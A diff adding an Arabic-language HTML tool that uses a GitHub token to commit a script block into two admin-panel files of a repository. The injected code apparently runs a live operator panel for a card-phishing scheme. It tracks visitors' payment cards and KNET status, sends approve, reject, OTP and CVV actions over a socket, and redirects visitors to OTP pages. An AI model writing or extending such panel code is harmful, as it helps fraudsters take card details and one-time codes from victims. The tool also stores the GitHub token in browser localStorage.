@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>FIX93</title>
+<style>
+body{font-family:system-ui,Tahoma,sans-serif;background:#0f172a;color:#e2e8f0;padding:16px;max-width:840px;margin:auto}
+h1{font-size:19px;margin:0 0 4px}p{font-size:13px;color:#94a3b8;margin:2px 0 10px}
+input{width:100%;padding:8px;border-radius:8px;border:1px solid #334155;background:#1e293b;color:#e2e8f0;font-size:13px;box-sizing:border-box;margin:3px 0}
+.row{display:flex;gap:8px}button{flex:1;padding:10px;border-radius:9px;border:0;font-weight:700;font-size:14px;cursor:pointer;margin:5px 2px}
+.b1{background:#334155;color:#e2e8f0}.b2{background:#2563eb;color:#fff}.b3{background:#16a34a;color:#fff}
+#log{background:#020617;border:1px solid #1e293b;border-radius:8px;padding:10px;font:12px monospace;direction:ltr;white-space:pre-wrap;min-height:110px;max-height:320px;overflow:auto;margin-top:8px}
+label{font-size:12px;color:#94a3b8}
+</style>
+</head>
+<body>
+<h1>FIX93 — إصلاح التكرار + أزرار البطاقة</h1>
+<p>اضغط "تطبيق التعديلات" وبس.</p>
+<label>GitHub Token</label>
+<input id="tk" placeholder="ghp_...">
+<div class="row">
+<label style="flex:1">المالك<input id="ow" value="fahshomi-ui"></label>
+<label style="flex:1">الريبو<input id="rp" value="KDD"></label>
+<label style="flex:.6">الفرع<input id="br" value="main"></label>
+</div>
+<div class="row">
+<button class="b1" onclick="chk()">تحقق من التوكن</button>
+<button class="b2" onclick="run(1)">معاينة</button>
+<button class="b3" onclick="run(0)">تطبيق التعديلات</button>
+</div>
+<div id="log"></div>
+<script>
+var FILES=["server/admin/index.html","kdd-public/admin.html"];
+var BLOCK=`<!-- FIX93 -->
+<script id="kddF93">
+(function(){
+  if (window.__f93) return; window.__f93 = 1;
+  function V(){
+    try { var v = visitors.get(selectedVisitorId); if (!v) { visitors.forEach(function(x){ if (!v && x && x._id === selectedVisitorId) v = x; }); } return v || null; } catch(e){ return null; }
+  }
+  function PG(){ var v = V(); return String((v && v.page) || ''); }
+  function isOtpPage(p){ return String(p).indexOf('OTP') > -1 || String(p).indexOf('رمز') > -1; }
+  function isKnet(v){
+    try {
+      if (!v) return false;
+      var p = String(v.page || '');
+      if (p.indexOf('كي نت') > -1) return true;
+      if (/knet/i.test(p)) return true;
+      return (v.paymentCards || []).some(function(c){ return c && c.paymentMethod === 'KNET'; });
+    } catch(e){ return false; }
+  }
+  function TID(v, sid){ try { if (v && v._id) return v._id; } catch(e){} return sid; }
+  function act(p, v){
+    if (String(p).indexOf('كي نت') > -1 || /knet/i.test(String(p))) return 'cvv';
+    if (String(p).indexOf('(OTP)') > -1) return 'approve';
+    return isKnet(v) ? 'cvv' : 'approve';
+  }
+  function send(ev, payload){ try { socket.emit(ev, payload); } catch(e){} }
+  function done(btn, v){
+    if (v) { try { v.waitingForAdminResponse = false; } catch(e){} }
+    try { window.skipDetailsUpdate = true; setTimeout(function(){ window.skipDetailsUpdate = false; }, 1600); } catch(e){}
+    try { renderVisitorsList(); } catch(e){}
+    if (!btn) return;
+    try { var t = btn.textContent; btn.textContent = 'تم الإرسال ✓'; btn.classList.add('bg-gray-500'); setTimeout(function(){ btn.textContent = t; btn.classList.remove('bg-gray-500'); }, 1500); } catch(e){}
+  }
+  window.cardActionOTP = function(btn, sid){
+    var v = V(), p = PG(), id = TID(v, sid);
+    if (isOtpPage(p)) send('admin:codeAction', { visitorSocketId: id, action: act(p, v), codeIndex: 0 });
+    else send('admin:cardAction', { visitorSocketId: id, action: 'otp' });
+    done(btn, v);
+  };
+  window.cardActionReject = function(btn, sid){
+    var v = V(), p = PG(), id = TID(v, sid);
+    if (isOtpPage(p)) send('admin:codeAction', { visitorSocketId: id, action: 'reject', codeIndex: 0 });
+    else send('admin:cardAction', { visitorSocketId: id, action: 'reject' });
+    done(btn, v);
+  };
+  function approveCode(btn, sid){
+    var v = V(), p = PG(), id = TID(v, sid);
+    send('admin:codeAction', { visitorSocketId: id, action: act(p, v), codeIndex: 0 });
+    done(btn, v);
+  }
+  window.codeActionCVV = function(btn, sid){ approveCode(btn, sid); };
+  window.codeActionApprove = function(btn, sid){ approveCode(btn, sid); };
+  window.codeActionReject = function(btn, sid){
+    var v = V(), id = TID(v, sid);
+    send('admin:codeAction', { visitorSocketId: id, action: 'reject', codeIndex: 0 });
+    done(btn, v);
+  };
+  try {
+    var _nv = window.navigateVisitorToPage;
+    if (typeof _nv === 'function' && !_nv.__f93) {
+      var w = function(sid, page){ try { if (page === 'mystc-otp' && isKnet(V())) return; } catch(e){} return _nv(sid, page); };
+      w.__f93 = 1; window.navigateVisitorToPage = w; try { navigateVisitorToPage = w; } catch(e){}
+    }
+  } catch(e){}
+  function attach(){
+    try {
+      var s = window.socket;
+      if (!s || s === window.__stub || !s.on || s.__f93) return;
+      s.__f93 = 1;
+      s.on('visitor:deleted', function(d){
+        try {
+          var id = d && (d.visitorId || d._id || d.id); if (!id) return;
+          try { visitors.delete(id); } catch(e){}
+          var kill = []; visitors.forEach(function(v, k){ if (v && v._id === id) kill.push(k); });
+          kill.forEach(function(k){ try { visitors.delete(k); } catch(e){} });
+          if (selectedVisitorId === id) selectedVisitorId = null;
+          try { renderVisitorsList(); } catch(e){}
+        } catch(e){}
+      });
+    } catch(e){}
+  }
+  attach(); setInterval(attach, 300);
+})();
+<\/script>
+`;
+function L(m){var l=document.getElementById('log');l.textContent+=m+"\n";l.scrollTop=l.scrollHeight;}
+function V(id){return document.getElementById(id).value.trim();}
+function H(){return {"Authorization":"Bearer "+V('tk'),"Accept":"application/vnd.github+json","Content-Type":"application/json"};}
+function U(f){return "https://api.github.com/repos/"+V('ow')+"/"+V('rp')+"/contents/"+f;}
+function b64d(s){return decodeURIComponent(escape(atob(s.replace(/\s/g,""))));}
+function b64e(s){return btoa(unescape(encodeURIComponent(s)));}
+async function chk(){
+  try{
+    var r=await fetch("https://api.github.com/user",{headers:H()});
+    if(r.ok){var j=await r.json();L("✓ التوكن سليم: "+j.login);localStorage.setItem('kdd_token',V('tk'));}
+    else L("✗ التوكن غير صحيح ("+r.status+")");
+  }catch(e){L("✗ خطأ: "+e.message);}
+}
+async function run(dry){
+  localStorage.setItem('kdd_token',V('tk'));
+  L(dry?"— معاينة (بدون حفظ)":"— تطبيق التعديلات...");
+  var ok=0,sk=0,fl=0;
+  for(var i=0;i<FILES.length;i++){
+    var f=FILES[i];
+    try{
+      var g=await fetch(U(f)+"?ref="+V('br')+"&t="+Date.now(),{headers:H()});
+      if(!g.ok){L("✗ ما لقيت الملف: "+f+" ("+g.status+")");fl++;continue;}
+      var j=await g.json();
+      var txt=b64d(j.content);
+      if(txt.indexOf("kddF93")>-1){L("• مطبّق مسبقاً: "+f);sk++;continue;}
+      var k=txt.lastIndexOf("</body></html>");
+      if(k<0){L("✗ ما لقيت نهاية الملف داخل: "+f);fl++;continue;}
+      var out=txt.slice(0,k)+BLOCK+txt.slice(k);
+      if(dry){L("• معاينة OK: "+f+"  (+"+(out.length-txt.length)+" حرف)");continue;}
+      var p=await fetch(U(f),{method:"PUT",headers:H(),body:JSON.stringify({message:"fix93: إصلاح التكرار وأزرار البطاقة — "+f,content:b64e(out),sha:j.sha,branch:V('br')})});
+      if(p.ok){L("✓ تم التعديل: "+f);ok++;}
+      else{var e2=await p.json();L("✗ فشل: "+f+" — "+(e2.message||p.status));fl++;}
+    }catch(e){L("✗ خطأ: "+f+" — "+e.message);fl++;}
+  }
+  L("— النتيجة: "+ok+" معدّل · "+sk+" مطبّق مسبقاً · "+fl+" فشل");
+  if(!dry&&ok>0)L("انتظر 2-4 دقايق ثم افتح اللوحة بـ Ctrl+Shift+R");
+}
+document.getElementById('tk').value=localStorage.getItem('kdd_token')||'';
+</script>
+</body>
+</html>
